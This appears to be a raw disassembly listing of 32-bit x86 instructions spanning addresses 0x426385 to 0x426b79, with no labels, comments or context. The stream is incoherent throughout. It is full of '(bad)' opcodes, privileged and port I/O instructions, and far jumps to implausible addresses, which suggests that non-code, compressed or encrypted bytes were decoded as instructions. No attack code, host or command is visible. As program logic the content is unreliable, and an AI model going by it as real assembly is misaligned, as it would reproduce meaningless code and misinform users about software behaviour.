  426385:	cmp    eax,0x2a16c80
  42638a:	nop
  42638b:	sub    cl,ch
  42638d:	push   esp
  42638e:	jnp    0x42636f
  426390:	push   cs
  426391:	rcr    BYTE PTR [edi],1
  426393:	mov    ebp,0x7f71722b
  426398:	sbb    al,0x72
  42639a:	hlt    
  42639b:	aam    0x74
  42639d:	aam    0x13
  42639f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4263a0:	sti    
  4263a1:	fwait
  4263a2:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4263a3:	jns    0x42638d
  4263a5:	fs push ds
  4263a7:	(bad)  
  4263a9:	stc    
  4263aa:	and    al,0xf6
  4263ac:	cmp    BYTE PTR [eax],dl
  4263ae:	imul   esi,ebp,0xd2e4034f
  4263b4:	or     ecx,edi
  4263b6:	adc    BYTE PTR [edi+0x4f],ch
  4263b9:	rcr    BYTE PTR [edi],1
  4263bb:	jg     0x4263bc
  4263bd:	gs std 
  4263bf:	add    BYTE PTR [edx-0x7a2b9cb5],cl
  4263c5:	addr16 cmp ch,al
  4263c8:	sbb    DWORD PTR [ecx+edx*2-0x25920bf4],0xffffffd4
  4263d0:	lds    ecx,FWORD PTR [edx]
  4263d2:	arpl   WORD PTR [ecx],dx
  4263d4:	mov    ah,0xd7
  4263d6:	xor    ch,BYTE PTR [edi-0xe36ad23]
  4263dc:	push   cs
  4263dd:	add    DWORD PTR [edx+0xf4d2a22],0x8
  4263e4:	push   eax
  4263e5:	adc    eax,0x3b444d1e
  4263ea:	mov    eax,0xa7bd8088
  4263ef:	aam    0x8d
  4263f1:	(bad)  
  4263f3:	add    edi,DWORD PTR [edi]
  4263f5:	jmp    0x9bd106bd
  4263fa:	adc    ebx,esi
  4263fc:	js     0x4263a1
  4263fe:	inc    edi
  4263ff:	hlt    
  426400:	pushf  
  426401:	add    edi,DWORD PTR [esi-0x4f]
  426404:	or     BYTE PTR [esi+0x5c9cd4d5],cl
  42640a:	test   BYTE PTR [edx+0x3d],cl
  42640d:	shl    BYTE PTR [eax-0x75],cl
  426410:	xlat   BYTE PTR ds:[ebx]
  426411:	cld    
  426412:	push   0x50dfcc3f
  426417:	stos   BYTE PTR es:[edi],al
  426418:	ret    
  426419:	add    BYTE PTR [edi+0x20],bl
  42641c:	in     al,dx
  42641d:	ret    0xb7d0
  426420:	pop    eax
  426421:	cld    
  426422:	jge    0x4263ad
  426424:	jbe    0x42646b
  426426:	xchg   DWORD PTR [eax+esi*1+0x7d],edx
  42642a:	adc    esp,DWORD PTR [ecx-0x1e]
  42642d:	std    
  42642e:	jle    0x426405
  426430:	or     eax,0x4d293e38
  426435:	daa    
  426436:	inc    edx
  426437:	jnp    0x4263bc
  426439:	sub    eax,0x36e28094
  42643e:	pop    ds
  42643f:	xor    DWORD PTR [edx-0x1a037c9b],edx
  426445:	add    ebx,DWORD PTR [esi+0x58]
  426448:	aad    0x69
  42644a:	add    DWORD PTR [eax],edx
  42644c:	in     eax,dx
  42644d:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42644e:	es dec esi
  426450:	xchg   edi,eax
  426451:	call   DWORD PTR [edx]
  426453:	test   BYTE PTR [eax+0x2d9cb082],cl
  426459:	xchg   ebp,eax
  42645a:	cmc    
  42645b:	imul   BYTE PTR fs:[ebp+0x5561d447]
  426462:	or     al,0x6c
  426464:	xor    BYTE PTR [ebx-0x24],al
  426467:	pop    ecx
  426468:	mov    ecx,0xaded6112
  42646d:	sbb    edx,DWORD PTR [ebp+0x276ed74c]
  426473:	jae    0x4264c3
  426475:	add    bl,BYTE PTR [edx]
  426477:	add    BYTE PTR [ebx],bh
  426479:	adc    eax,0xb9efa2d8
  42647e:	pop    ds
  42647f:	sbb    DWORD PTR [eax+0x6d973ddb],edx
  426485:	call   0x38b43e6
  42648a:	push   esi
  42648b:	inc    edx
  42648c:	mov    ds:0x24edee60,al
  426491:	or     eax,0x1acd8565
  426496:	js     0x4264eb
  426498:	stos   BYTE PTR es:[edi],al
  426499:	gs iret 
  42649b:	pop    edx
  42649c:	inc    BYTE PTR ds:0x5e6b4928
  4264a2:	mov    eax,0x30ca6354
  4264a7:	cmp    eax,0x5e8d4f88
  4264ac:	jmp    0xaff1:0x9fb0117c
  4264b3:	enter  0x5cd,0x68
  4264b7:	fmul   QWORD PTR [ecx+edi*4]
  4264ba:	mov    ebx,0x3dda06e
  4264bf:	adc    BYTE PTR [eax-0x4e9501ff],cl
  4264c5:	cs dec ecx
  4264c7:	adc    al,0xe3
  4264c9:	add    eax,0x68aaed08
  4264ce:	(bad)  
  4264cf:	jbe    0x42652c
  4264d1:	push   cs
  4264d2:	pusha  
  4264d3:	(bad)  
  4264d4:	aam    0x83
  4264d6:	outs   dx,BYTE PTR ds:[esi]
  4264d7:	test   eax,0xdd91cc37
  4264dc:	dec    ebp
  4264dd:	add    ah,BYTE PTR [eax+0x4f]
  4264e0:	out    0x81,al
  4264e2:	xor    eax,0x1f0218e9
  4264e7:	jne    0x4264d1
  4264e9:	mov    cl,0x9e
  4264eb:	push   cs
  4264ec:	push   esp
  4264ed:	fs dec edx
  4264ef:	call   0xee37:0xd7134073
  4264f6:	lock pop esp
  4264f8:	loop   0x42654a
  4264fa:	push   ds
  4264fb:	sti    
  4264fc:	inc    ecx
  4264fd:	in     al,dx
  4264fe:	dec    esi
  4264ff:	lahf   
  426500:	fistp  WORD PTR [esi]
  426502:	pop    ss
  426503:	cmp    al,0xa8
  426505:	jmp    0x426567
  426507:	push   edi
  426508:	rol    BYTE PTR [ecx-0x72816490],1
  42650e:	pop    ds
  42650f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426510:	popf   
  426511:	push   ecx
  426512:	jp     0x426539
  426514:	dec    esp
  426515:	mov    DWORD PTR [esp+edx*8],edi
  426518:	(bad)  
  426519:	cmp    bl,BYTE PTR [ebx-0x311a6ef2]
  42651f:	punpckhwd mm0,QWORD PTR [esi+0x5aa1393]
  426526:	push   ebx
  426527:	aaa    
  426528:	sbb    eax,0x4b9f0cd
  42652d:	jo     0x426529
  42652f:	sub    eax,0xf8f41f88
  426534:	xchg   esi,eax
  426535:	in     eax,dx
  426536:	push   ss
  426537:	fidiv  WORD PTR [eax]
  426539:	stos   BYTE PTR es:[edi],al
  42653a:	mov    esp,0x6bcff0d4
  42653f:	inc    edx
  426540:	or     dl,BYTE PTR [ebx-0x17422b4b]
  426546:	aaa    
  426547:	dec    esp
  426548:	pop    ebx
  426549:	jp     0x42652c
  42654b:	sti    
  42654c:	mov    DWORD PTR [ecx-0x61],edi
  42654f:	pop    ss
  426550:	inc    edx
  426551:	mov    dl,0xc
  426553:	std    
  426554:	add    BYTE PTR [ebx],al
  426556:	pushf  
  426557:	ja     0x42650d
  426559:	out    0xa,eax
  42655b:	or     ch,0x88
  42655e:	xchg   esi,eax
  42655f:	lods   eax,DWORD PTR ds:[esi]
  426560:	cld    
  426561:	add    dh,BYTE PTR [edx]
  426563:	(bad)  [ecx-0x46]
  426566:	mov    esp,0x4a05fab9
  42656b:	jmp    0x113dd76
  426570:	jns    0x426596
  426572:	push   ds
  426573:	or     ebp,ecx
  426575:	xchg   ecx,eax
  426576:	xchg   edi,eax
  426577:	xchg   ebp,eax
  426578:	push   cs
  426579:	retf   0xc137
  42657c:	sbb    BYTE PTR [ebx-0x42],cl
  42657f:	aam    0x50
  426581:	lock (bad) 
  426583:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426584:	loope  0x42654a
  426586:	aas    
  426587:	cmp    cl,BYTE PTR [ecx-0x1c88b2f3]
  42658d:	inc    ebp
  42658e:	into   
  42658f:	and    bh,BYTE PTR [ecx+0x3]
  426592:	push   esi
  426593:	jge    0x4265ab
  426595:	fwait
  426596:	push   0x4b
  426598:	pusha  
  426599:	pop    ss
  42659a:	jp     0x426547
  42659c:	hlt    
  42659d:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42659e:	out    dx,eax
  42659f:	imul   ebp,DWORD PTR [esi],0xffffffb5
  4265a2:	loopne 0x426536
  4265a4:	adc    eax,0xf15a74e7
  4265a9:	out    0x1f,al
  4265ab:	btc    DWORD PTR [edi],ecx
  4265ae:	lea    esp,[ebp-0x8]
  4265b1:	push   ecx
  4265b2:	xchg   edi,eax
  4265b3:	inc    edi
  4265b4:	sub    DWORD PTR [edx],eax
  4265b6:	or     BYTE PTR [ebx+0x13929299],0x31
  4265bd:	and    dl,BYTE PTR [edi]
  4265bf:	not    BYTE PTR [ebx+0x4a]
  4265c2:	push   0x949ff8ad
  4265c7:	leave  
  4265c8:	push   0xb32cc0c1
  4265cd:	adc    eax,0xab228b1e
  4265d2:	lds    edi,FWORD PTR [edx-0x23933451]
  4265d8:	add    al,BYTE PTR [edx]
  4265da:	rol    BYTE PTR [esi+0x6de76ac6],1
  4265e0:	xor    eax,0xdac1654b
  4265e5:	loopne 0x426571
  4265e7:	ror    BYTE PTR [esi+0x13],0xc1
  4265eb:	jmp    0xedde:0xd5560a86
  4265f2:	data16 je 0x42659a
  4265f5:	mov    dh,0x2b
  4265f7:	push   edx
  4265f8:	mov    DWORD PTR [ebx+0x46],edx
  4265fb:	loope  0x426616
  4265fd:	mov    WORD PTR ds:0x96059e0e,gs
  426603:	sti    
  426604:	inc    ebp
  426605:	xchg   DWORD PTR [ecx+0x600dd5a8],edi
  42660b:	push   edi
  42660c:	mov    ds:0xa0fc62cc,al
  426611:	js     0x4265f7
  426613:	aad    0x56
  426615:	cli    
  426616:	lods   al,BYTE PTR ds:[esi]
  426617:	fidiv  DWORD PTR [eax]
  426619:	inc    esp
  42661a:	sub    al,0x3
  42661c:	mov    dh,BYTE PTR [ebp-0x57]
  42661f:	xchg   DWORD PTR [ebp-0x44],esp
  426622:	dec    eax
  426623:	mov    ebp,0xd4deaf40
  426628:	inc    ecx
  426629:	push   ecx
  42662a:	test   BYTE PTR [eax-0x7f],0xa1
  42662e:	pop    eax
  42662f:	outs   dx,DWORD PTR ds:[esi]
  426630:	icebp  
  426631:	adc    eax,0xde2cd249
  426636:	or     BYTE PTR [eax-0x7b5d6d4e],0x47
  42663d:	add    ah,BYTE PTR [esi-0x30]
  426640:	mov    BYTE PTR [ecx+ebp*4],bh
  426643:	retf   0x391f
  426646:	add    bl,BYTE PTR [esi]
  426648:	lock adc eax,0x19d2bbdc
  42664e:	jmp    0x4fd7:0x347ae4aa
  426655:	or     eax,esp
  426657:	cld    
  426658:	sbb    DWORD PTR [esi],esi
  42665a:	xor    al,0x0
  42665c:	rol    BYTE PTR [eax],1
  42665e:	xor    al,0xcc
  426660:	sahf   
  426661:	outs   dx,BYTE PTR ds:[esi]
  426662:	iret   
  426663:	vpsrlw ymm3,ymm0,XMMWORD PTR [edi]
  426667:	pop    ecx
  426668:	sub    al,ch
  42666a:	fimul  DWORD PTR [eax-0x468c1d14]
  426670:	jl     0x4266bd
  426672:	push   edx
  426673:	mov    al,0x8
  426675:	push   ebx
  426676:	popf   
  426677:	rol    esi,1
  426679:	xchg   BYTE PTR [eax],bl
  42667b:	mov    dh,0xfe
  42667d:	loope  0x42667d
  42667f:	stos   DWORD PTR es:[edi],eax
  426680:	cmp    edx,DWORD PTR [esi]
  426682:	dec    edi
  426683:	ret    0x9ac8
  426686:	mov    ebp,0x4c24a9d3
  42668b:	mov    DWORD PTR [ebp+ebp*1+0x6d],edi
  42668f:	dec    eax
  426690:	adc    al,0x82
  426692:	gs push ss
  426694:	(bad)  
  426695:	loope  0x4266a2
  426697:	adc    ecx,DWORD PTR [ecx-0x39dd632b]
  42669d:	pop    edi
  42669e:	(bad)  
  42669f:	adc    al,0x1b
  4266a1:	mov    bl,0xf5
  4266a3:	les    eax,FWORD PTR [esi-0x33b2794f]
  4266a9:	mov    ?,WORD PTR [ecx]
  4266ab:	mov    ebx,0x181f0c5d
  4266b0:	(bad)  
  4266b1:	or     BYTE PTR [edx+0x354d961d],dh
  4266b7:	bound  esp,QWORD PTR [ebx+0x61d39b09]
  4266bd:	xor    DWORD PTR [ecx],esp
  4266bf:	jns    0x42672a
  4266c1:	sub    dl,0x2a
  4266c4:	or     eax,0x2e8cfe03
  4266c9:	call   0x55be5d5a
  4266ce:	push   edi
  4266cf:	mul    DWORD PTR [ebp-0x660b61b1]
  4266d5:	popf   
  4266d6:	imul   eax,DWORD PTR [edi+0x4b840212],0x1187af04
  4266e0:	and    ah,bh
  4266e2:	sahf   
  4266e3:	in     eax,0xae
  4266e5:	add    eax,0x6ddf22e9
  4266ea:	sti    
  4266eb:	cdq    
  4266ec:	mov    al,ds:0x8e308202
  4266f1:	dec    esp
  4266f2:	repnz pop ds
  4266f4:	push   esp
  4266f5:	mov    al,ds:0xe360cb1f
  4266fa:	clc    
  4266fb:	adc    BYTE PTR [esi],cl
  4266fd:	outs   dx,DWORD PTR ds:[esi]
  4266fe:	cli    
  4266ff:	aam    0xf4
  426701:	jae    0x4266cc
  426703:	repnz pop edx
  426705:	add    ebx,eax
  426707:	ins    BYTE PTR es:[edi],dx
  426708:	mov    DWORD PTR [edi],ebp
  42670a:	sub    BYTE PTR [eax],bl
  42670c:	jle    0x4266b1
  42670e:	jp     0x426751
  426710:	push   cs
  426711:	jecxz  0x42677c
  426713:	aam    0xa
  426715:	mov    dl,0x44
  426717:	fld    TBYTE PTR [ecx+0x5cd1a0b9]
  42671d:	test   DWORD PTR [eax-0x5b],esp
  426720:	in     al,0x8d
  426722:	inc    ebx
  426723:	es pop ecx
  426725:	jnp    0x4266ff
  426727:	mov    ch,0x76
  426729:	add    ch,BYTE PTR [eax+ecx*4-0x6e]
  42672d:	ins    DWORD PTR es:[edi],dx
  42672e:	fild   WORD PTR [ecx]
  426730:	scas   al,BYTE PTR es:[edi]
  426731:	xchg   ebp,eax
  426732:	pusha  
  426733:	sub    bh,BYTE PTR gs:[esi+0xa6e1529]
  42673a:	mov    al,0xd5
  42673c:	mov    ecx,ecx
  42673e:	adc    eax,0x43280826
  426743:	xchg   esp,eax
  426744:	mov    BYTE PTR ds:0x60ede5c8,bh
  42674a:	cmc    
  42674b:	or     al,al
  42674d:	sbb    eax,0xcefce40
  426752:	sub    ah,BYTE PTR [ebp-0x10e51c88]
  426758:	dec    ebx
  426759:	mov    ebp,0x7a79d31f
  42675e:	in     eax,dx
  42675f:	cs int3 
  426761:	jbe    0x42670d
  426763:	(bad)  
  426764:	mov    edi,0x80fe4e01
  426769:	outs   dx,BYTE PTR ds:[esi]
  42676a:	xor    bl,BYTE PTR [edi]
  42676c:	dec    esi
  42676d:	repnz pop ds
  42676f:	std    
  426770:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426771:	out    dx,eax
  426772:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  426773:	pop    ebp
  426774:	jo     0x4267ec
  426776:	cdq    
  426777:	aad    0x41
  426779:	cmc    
  42677a:	leave  
  42677b:	dec    edi
  42677c:	xor    BYTE PTR ds:[eax+0x6d39801a],ch
  426783:	arpl   si,cx
  426785:	or     DWORD PTR [ebp+0x60afd2b8],edi
  42678b:	xlat   BYTE PTR ds:[ebx]
  42678c:	cmp    al,0xe8
  42678e:	and    al,0x53
  426790:	xchg   edi,eax
  426791:	jno    0x42674b
  426793:	cmp    edx,DWORD PTR [ecx+0x1d]
  426796:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426797:	push   esi
  426798:	int3   
  426799:	add    eax,0xc8abd16
  42679e:	mov    dl,0x57
  4267a0:	xchg   BYTE PTR [esi+ebx*1-0x19],ah
  4267a4:	cwde   
  4267a5:	xchg   edx,eax
  4267a6:	lods   eax,DWORD PTR ds:[esi]
  4267a7:	xchg   ebp,eax
  4267a8:	inc    edx
  4267a9:	mov    BYTE PTR [edi-0x7661652c],ch
  4267af:	cld    
  4267b0:	bound  ebp,QWORD PTR [edi+0x1]
  4267b3:	cmp    dl,BYTE PTR [esi+0x25669e17]
  4267b9:	add    edx,ecx
  4267bb:	hlt    
  4267bc:	add    eax,0xcac4b64a
  4267c1:	add    eax,0x99628276
  4267c6:	enter  0xd375,0x81
  4267ca:	pop    ds
  4267cb:	stc    
  4267cc:	loope  0x426782
  4267ce:	dec    esp
  4267cf:	fst    QWORD PTR [edx+ebx*1]
  4267d2:	sub    eax,0xd134ad7
  4267d7:	push   0x97731ce3
  4267dc:	sahf   
  4267dd:	out    0x1,eax
  4267df:	mov    edi,0x7eb202e1
  4267e4:	inc    esp
  4267e5:	scas   al,BYTE PTR es:[edi]
  4267e6:	pop    edx
  4267e7:	aad    0x29
  4267e9:	xchg   ebx,eax
  4267ea:	nop
  4267eb:	ja     0x42685c
  4267ed:	dec    ebp
  4267ee:	lds    ebx,FWORD PTR [ebp-0x4f]
  4267f1:	add    eax,0xb18899bb
  4267f6:	imul   ebp,DWORD PTR [ebx],0x21
  4267f9:	sbb    dh,dh
  4267fb:	inc    edi
  4267fc:	popf   
  4267fd:	daa    
  4267fe:	pop    ds
  4267ff:	mov    fs,WORD PTR [ecx+0x61]
  426802:	sar    DWORD PTR [esi-0x1f],cl
  426805:	xor    eax,0x96bda369
  42680a:	push   0xa
  42680c:	mov    DWORD PTR [ebp+0x5417c4aa],ebx
  426812:	jl     0x426856
  426814:	sub    dl,bl
  426816:	pop    ds
  426817:	rcl    DWORD PTR [edi+0x53],cl
  42681a:	std    
  42681b:	xchg   esp,eax
  42681c:	fdivr  DWORD PTR ds:0xb310871f
  426822:	mov    ebp,0x3ef0caca
  426827:	aam    0x9a
  426829:	jecxz  0x426879
  42682b:	ret    
  42682c:	jae    0x4267b5
  42682e:	dec    edx
  42682f:	mov    ds:0x39950d49,al
  426834:	scas   al,BYTE PTR es:[edi]
  426835:	add    ah,BYTE PTR [esi]
  426837:	sub    BYTE PTR [edx-0xe],ch
  42683a:	fimul  DWORD PTR [ebp+0x518a4896]
  426840:	sbb    DWORD PTR ds:0xbd0f62d2,ebx
  426846:	mov    al,ds:0x5b4e2fc6
  42684b:	addr16 jno 0x4267d0
  42684e:	pop    ds
  42684f:	sbb    al,0x26
  426851:	sbb    BYTE PTR [esi+eiz*1],ah
  426854:	add    cl,BYTE PTR [bp+si-0x62]
  426858:	aad    0xe1
  42685a:	add    BYTE PTR [eax+0x291e28e4],dh
  426860:	xor    al,0x17
  426862:	test   eax,0xd63c8a6c
  426867:	aam    0x6b
  426869:	mov    ?,WORD PTR [esp+ecx*2+0x244a66cf]
  426870:	mov    ecx,ebx
  426872:	and    edi,eax
  426874:	jmp    0xef289172
  426879:	ret    0xd738
  42687c:	jbe    0x42682d
  42687e:	iret   
  42687f:	xor    edx,ebp
  426881:	das    
  426882:	inc    ebx
  426883:	test   BYTE PTR [edx-0x608d3ad],cl
  426889:	js     0x426908
  42688b:	fld    TBYTE PTR [eax+0x43]
  42688e:	lds    esp,FWORD PTR [edi-0x3e54e39d]
  426894:	mov    BYTE PTR [edi-0x7688952e],dl
  42689a:	pusha  
  42689b:	repz or eax,0xf8a9b198
  4268a1:	push   edi
  4268a2:	mov    esp,0xcd5a1bab
  4268a7:	or     ah,0x7c
  4268aa:	aam    0x58
  4268ac:	mov    dl,0x75
  4268ae:	and    BYTE PTR [edx-0x78],0xfb
  4268b2:	loop   0x426908
  4268b4:	xchg   esp,eax
  4268b5:	xchg   edx,eax
  4268b6:	lock aad 0xe4
  4268b9:	out    dx,eax
  4268ba:	push   ss
  4268bb:	dec    edx
  4268bc:	inc    edi
  4268bd:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4268be:	xchg   ebp,eax
  4268bf:	pop    ebx
  4268c0:	pushf  
  4268c1:	sub    DWORD PTR [edx+0x60e21076],ecx
  4268c7:	das    
  4268c8:	bnd ret 
  4268ca:	inc    eax
  4268cb:	mov    ah,0x2b
  4268cd:	xchg   DWORD PTR [ebx+0x6c7c8862],ebx
  4268d3:	sbb    DWORD PTR [eax-0x4cd9351d],ebx
  4268d9:	in     eax,dx
  4268da:	jno    0x4268fe
  4268dc:	fwait
  4268dd:	sub    eax,0xffffffd5
  4268e0:	in     eax,0x61
  4268e2:	(bad)  
  4268e3:	or     BYTE PTR [esi+0x1d],al
  4268e6:	xchg   esp,eax
  4268e7:	and    eax,0xd8961ac0
  4268ec:	leave  
  4268ed:	ret    0x35b0
  4268f0:	mov    ecx,ebp
  4268f2:	push   cs
  4268f3:	and    eax,0x396d6f08
  4268f8:	pop    edi
  4268f9:	push   ebx
  4268fa:	xchg   ebp,eax
  4268fb:	push   esp
  4268fc:	das    
  4268fd:	add    ebx,eax
  4268ff:	cmp    DWORD PTR [ebx+0x1],eax
  426902:	add    cl,BYTE PTR [esi-0x2b]
  426905:	and    al,0xee
  426907:	mov    DWORD PTR [edi],0xc0bb0a03
  42690d:	test   al,0xf5
  42690f:	xchg   BYTE PTR [eax+0x3],ah
  426912:	mov    esi,0xa5ef0754
  426917:	pop    ebp
  426918:	inc    esp
  426919:	loope  0x42693a
  42691b:	jno    0x42693b
  42691d:	pusha  
  42691e:	mul    BYTE PTR [ebp+0x2b]
  426921:	inc    ebx
  426922:	pop    edx
  426923:	idiv   ebx
  426925:	add    dl,BYTE PTR [eax-0x3b]
  426928:	sti    
  426929:	cmp    edi,ebx
  42692b:	inc    ecx
  42692c:	js     0x426993
  42692e:	pop    edx
  42692f:	(bad)  
  426930:	or     eax,0xff8eed30
  426935:	jb     0x42695b
  426937:	mov    eax,ds:0xfc56b5a3
  42693c:	shr    ch,1
  42693e:	in     al,dx
  42693f:	leave  
  426940:	jp     0x426987
  426942:	in     al,dx
  426943:	xchg   edi,eax
  426944:	jmp    0x795ccd4e
  426949:	mov    DWORD PTR [esi],ebp
  42694b:	jns    0x42690e
  42694d:	cmp    DWORD PTR [esi],edi
  42694f:	je     0x4268d9
  426951:	and    DWORD PTR [ebx-0x2fbae7fc],eax
  426957:	stc    
  426958:	and    eax,0xb420fe02
  42695d:	or     DWORD PTR ds:0xbf12205,edi
  426963:	gs test eax,0xd24f6094
  426969:	std    
  42696a:	push   edx
  42696b:	mov    edi,0xd5ffbee2
  426970:	jge    0x4269e2
  426972:	mov    ah,0xc8
  426974:	shl    BYTE PTR [edx+0x4],0x23
  426978:	mov    BYTE PTR [ebx+0x36aac8f2],ah
  42697e:	and    DWORD PTR [ebx-0x2fa1254c],ecx
  426984:	out    dx,eax
  426985:	(bad)  
  426987:	ins    BYTE PTR es:[edi],dx
  426988:	das    
  426989:	fsub   QWORD PTR [eax]
  42698b:	icebp  
  42698c:	int    0x99
  42698e:	nop
  42698f:	and    cl,BYTE PTR [ecx+0x5d01eccf]
  426995:	dec    ebx
  426996:	cmp    eax,0xd002eae0
  42699b:	pop    edi
  42699c:	push   eax
  42699d:	jnp    0x4269c8
  42699f:	enter  0xfbe1,0x1f
  4269a3:	lahf   
  4269a4:	jns    0x4269d5
  4269a6:	imul   di,WORD PTR [eax],0x1228
  4269ab:	xlat   BYTE PTR ds:[ebx]
  4269ac:	and    al,0x77
  4269ae:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4269af:	or     DWORD PTR [edx+eax*4],0xa9860697
  4269b6:	ss cmp al,0x1
  4269b9:	xchg   esp,eax
  4269ba:	jg     0x4269af
  4269bc:	sar    DWORD PTR [edx+0x1460f737],0x54
  4269c3:	in     eax,0xf6
  4269c5:	iret   
  4269c6:	adc    DWORD PTR [ebp-0x45b97b83],0xb3000989
  4269d0:	mov    edx,0xb4441072
  4269d5:	jecxz  0x4269ba
  4269d7:	aad    0x60
  4269d9:	push   esi
  4269da:	xchg   edx,eax
  4269db:	ins    BYTE PTR es:[edi],dx
  4269dc:	add    eax,0x979af36d
  4269e1:	xadd   DWORD PTR [ebp+edx*1-0x7e],esi
  4269e6:	(bad)  
  4269e7:	cli    
  4269e8:	xchg   edx,eax
  4269e9:	stos   BYTE PTR es:[edi],al
  4269ea:	ins    BYTE PTR es:[edi],dx
  4269eb:	aad    0x58
  4269ed:	sbb    eax,0x437acad
  4269f2:	test   eax,0xd6e5889c
  4269f7:	cs xor eax,0xd72befcc
  4269fd:	dec    ebx
  4269fe:	sahf   
  4269ff:	das    
  426a00:	xchg   BYTE PTR [ebp-0x10266192],al
  426a06:	sbb    al,0x88
  426a08:	mov    DWORD PTR [edi-0x4e439fff],ebx
  426a0e:	mov    ecx,0x3e17aa9a
  426a13:	inc    eax
  426a14:	data16 loop 0x4269b1
  426a17:	xor    al,0x55
  426a19:	mov    ebp,0xc78f196e
  426a1e:	sbb    bh,0x9
  426a21:	(bad)  
  426a22:	fbstp  TBYTE PTR [esi+edx*8-0x4c5afcbb]
  426a29:	jo     0x426aa3
  426a2b:	icebp  
  426a2c:	xchg   ecx,eax
  426a2d:	fild   QWORD PTR [eax]
  426a2f:	jns    0x4269b9
  426a31:	outs   dx,BYTE PTR ds:[esi]
  426a32:	rol    BYTE PTR [eax+ecx*4],0xcd
  426a36:	stc    
  426a37:	cmc    
  426a38:	jae    0x426aa4
  426a3a:	rcr    BYTE PTR [ebp-0x2aa920b4],1
  426a40:	test   BYTE PTR [edx-0x3a367ee7],dh
  426a46:	mov    ecx,0xe61d89b3
  426a4b:	or     al,0xfb
  426a4d:	sub    edi,esp
  426a4f:	cmp    eax,0x2edc0276
  426a54:	fwait
  426a55:	mov    eax,DWORD PTR [ecx]
  426a57:	cmp    bl,BYTE PTR [esi-0x8]
  426a5a:	fcom   DWORD PTR [ecx-0x80]
  426a5d:	add    ch,BYTE PTR [eax+0x55868b4e]
  426a63:	mov    eax,ds:0x733427c3
  426a68:	fdiv   st(1),st
  426a6a:	loope  0x426a77
  426a6c:	dec    eax
  426a6d:	pop    esi
  426a6e:	pop    es
  426a6f:	imul   DWORD PTR [eax+eax*8+0x60]
  426a73:	std    
  426a74:	imul   eax,edi,0x26
  426a77:	in     al,0x26
  426a79:	xchg   edx,eax
  426a7a:	mov    ecx,0x3a544cd5
  426a7f:	push   cs
  426a80:	int    0xcb
  426a82:	int3   
  426a83:	jno    0x426a0d
  426a85:	popf   
  426a86:	arpl   WORD PTR [edx-0x1d715127],bx
  426a8c:	les    eax,FWORD PTR ds:0xca133d4c
  426a92:	and    edx,edx
  426a94:	int3   
  426a95:	icebp  
  426a96:	pusha  
  426a97:	shl    eax,cl
  426a99:	jo     0x426a75
  426a9b:	iret   
  426a9c:	pushf  
  426a9d:	jg     0x426a86
  426a9f:	scas   al,BYTE PTR es:[edi]
  426aa0:	and    ch,BYTE PTR [edi+0x48]
  426aa3:	int    0x8b
  426aa5:	add    bh,BYTE PTR [ecx]
  426aa7:	mov    bl,0x3d
  426aa9:	xor    bh,BYTE PTR [ecx+ebp*2+0x50]
  426aad:	cdq    
  426aae:	in     eax,0x15
  426ab0:	(bad)  
  426ab1:	std    
  426ab2:	scas   eax,DWORD PTR es:[edi]
  426ab3:	fnstcw WORD PTR [ebp+ebx*1-0x76]
  426ab7:	loop   0x426aba
  426ab9:	push   cs
  426aba:	int    0x7
  426abc:	dec    ecx
  426abd:	imul   edi,DWORD PTR [ebx],0xb533886e
  426ac3:	iret   
  426ac4:	les    ebp,FWORD PTR [edx]
  426ac6:	push   ebx
  426ac7:	dec    ebx
  426ac8:	mov    BYTE PTR ds:0xc968f8e,0x23
  426acf:	mov    edx,0xb8104318
  426ad4:	mov    eax,ds:0x409e26c5
  426ad9:	add    edi,esi
  426adb:	mov    al,ds:0xa7a7ed84
  426ae0:	pop    ecx
  426ae1:	inc    edi
  426ae2:	push   0x84800f5a
  426ae7:	cmp    al,0x7c
  426ae9:	push   0x738ecdbf
  426aee:	pop    ds
  426aef:	sti    
  426af0:	or     edx,eax
  426af2:	idiv   bl
  426af4:	and    BYTE PTR [edx+0x5bf7d4d0],0xfe
  426afb:	cmp    DWORD PTR [ecx-0x2a],0x38
  426aff:	jmp    0x426a89
  426b01:	or     edi,DWORD PTR [ebp-0x3d]
  426b04:	adc    ecx,edi
  426b06:	in     al,dx
  426b07:	aam    0x4d
  426b09:	add    ah,BYTE PTR [edi+eax*1]
  426b0c:	test   ebx,ebp
  426b0e:	xchg   esp,eax
  426b0f:	mov    eax,0xdd61d44e
  426b14:	push   edx
  426b15:	push   cs
  426b16:	fldenv [ecx-0x20]
  426b19:	push   0x37
  426b1b:	std    
  426b1c:	jne    0x426b69
  426b1e:	data16 cs lahf 
  426b21:	and    al,0x47
  426b23:	jno    0x426afc
  426b25:	popf   
  426b26:	pusha  
  426b27:	or     BYTE PTR [edi-0x76c8f0dc],ah
  426b2d:	pop    edi
  426b2e:	hlt    
  426b2f:	retf   
  426b30:	adc    ebx,DWORD PTR [edi+eax*1]
  426b33:	or     ebp,ecx
  426b35:	add    bh,BYTE PTR [edx]
  426b37:	popf   
  426b38:	cmc    
  426b39:	add    BYTE PTR [ecx],dl
  426b3b:	fild   DWORD PTR [ebx+0x702d60bd]
  426b41:	ret    0x5e16
  426b44:	xchg   edx,eax
  426b45:	outs   dx,BYTE PTR ds:[esi]
  426b46:	xchg   ebp,eax
  426b47:	aad    0x3a
  426b49:	in     al,dx
  426b4a:	imul   edi,DWORD PTR [eax-0x3ee280c0],0x49742589
  426b54:	jnp    0x426bbc
  426b56:	cs mov esi,0xdb2849fd
  426b5c:	or     eax,0xa075a502
  426b61:	adc    DWORD PTR [ebx+0xac58e2a],ecx
  426b67:	lods   al,BYTE PTR ds:[esi]
  426b68:	imul   ebp,DWORD PTR [edi],0x14
  426b6b:	inc    esi
  426b6c:	mov    cl,0x5e
  426b6e:	push   ds
  426b6f:	jmp    FWORD PTR [ebp+0x22]
  426b72:	pop    ebp
  426b73:	and    BYTE PTR [esi-0x69],0x60
  426b77:	add    DWORD PTR [ecx],edi
  426b79:	je     0x426bd3
